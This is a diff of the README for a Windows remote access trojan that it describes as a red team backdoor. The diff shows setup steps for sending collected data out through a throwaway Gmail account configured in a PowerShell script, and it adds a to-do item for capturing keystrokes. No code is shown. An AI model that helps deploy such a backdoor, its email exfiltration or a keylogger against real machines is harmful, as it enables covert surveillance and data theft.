@@ -8,5 +8,8 @@ This RAT will help someone during red team engagements to backdoor any Windows m
 # Setup
 - Throwaway Gmail email address
 - Enable "Allow less secure apps" by going to https://myaccount.google.com/lesssecureapps
-- Modify the `$username` & `$password` variable for your account in the Mail.ps1 poweshell file
+- Modify the `$username` & `$password` variable for your account in the `Mail.ps1` Powershell file
 - Modify `$msg.From` & `$msg.To.Add` with throwaway gmail address
+
+# To Do
+- Get keyboard strokes
